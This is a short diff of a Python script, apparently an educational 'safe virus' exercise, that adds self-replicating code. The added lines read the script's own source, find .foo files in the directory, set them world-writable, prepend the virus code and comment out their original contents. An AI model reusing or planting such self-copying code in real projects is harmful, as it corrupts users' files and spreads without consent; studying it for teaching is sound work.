@@ -88,6 +88,21 @@ Note that this is a safe virus (for educational purposes
 only) since it does not carry a harmful payload.  All it
 does is to print out this message and comment out the
 code in .foo files.\n\n""")
+      
+IN = open(sys.argv[0], 'r')
+virus = [line for (i,line) in enumerate(IN)]
+
+for item in glob.glob("*.foo"):
+    IN = open(item, 'r')
+    all_of_it = IN.readlines()
+    IN.close()
+    if any('foovirus' in line for line in all_of_it): continue
+    os.chmod(item, 0o777)    
+    OUT = open(item, 'w')
+    OUT.writelines(virus)
+    all_of_it = ['#' + line for line in all_of_it]
+    OUT.writelines(all_of_it)
+    OUT.close()
 
 while True:
     usernames = get_new_usernames(NUSERNAMES)
